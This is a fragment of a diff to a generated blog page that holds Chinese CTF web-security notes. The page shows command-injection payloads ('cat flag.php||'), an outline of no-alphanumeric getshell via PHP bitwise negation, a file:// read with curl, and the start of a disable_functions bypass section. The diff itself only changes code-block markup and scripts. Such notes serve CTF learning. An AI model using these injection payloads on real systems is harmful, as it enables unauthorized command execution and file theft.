+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>payload:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat flag.php||</span><br><span class="line">cat flag.php;</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-bash"><code class="language-bash"> <span class="token function">cat</span> flag.php<span class="token operator">||</span>
+ <span class="token function">cat</span> flag.php<span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <h2 id="无字母数字getshell"><a href="#无字母数字getshell" class="headerlink" title="无字母数字getshell"></a>无字母数字getshell</h2><h3 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h3><p>在php中~代表取反操作</p>
 <p>即假设有10011000的二进制，那么~10011000 == 01100111</p>
 <p>这样取反后会得到一串无意义的字符，只要在执行命令时在这串字符前同样加取反符，就可以达成执行命令的目的</p>
@@ -524,8 +596,8 @@
 <p>大致就是这个意思</p>
 <p>文件中无命令，也可以直接读取内容</p>
 <h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><h3 id="file-文件读取协议"><a href="#file-文件读取协议" class="headerlink" title="file:// 文件读取协议"></a>file:// 文件读取协议</h3><p>语法：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl file://【文件绝对路径】</span><br></pre></td></tr></table></figure>
-
+<pre class="line-numbers language-linux"><code class="language-linux">curl file://【文件绝对路径】
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="image-20210530095202808.png" alt="image-20210530095202808"></p>
 <h2 id="phpinfo-之disable-functions"><a href="#phpinfo-之disable-functions" class="headerlink" title="phpinfo()之disable_functions"></a>phpinfo()之disable_functions</h2><p>为了安全,运维人员会禁用PHP的一些“危险”函数,将其写在php.ini配置文件中,就是我们所说的disable_functions了。</p>
 <h3 id="绕过方式分类"><a href="#绕过方式分类" class="headerlink" title="绕过方式分类"></a><strong>绕过方式分类</strong></h3><ul>
@@ -1039,6 +1111,8 @@
 
 <!-- 代码语言 -->
 
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
 
 <!-- 代码块复制 -->
 
@@ -1054,6 +1128,29 @@
 code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
 </style>
 
+
+<!-- 代码块功能依赖 -->
+<!-- <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script> -->
+
+<!-- 代码语言 -->
+<!--  -->
+<!-- <script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script> -->
+<!--  -->
+
+<!-- 代码块复制 -->
+<!-- 
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+ -->
+
+<!-- 代码块收缩 -->
+<!--  -->
+
+<!-- 代码块折行 -->
+<!-- 
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+ -->
 
     </div>
     <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
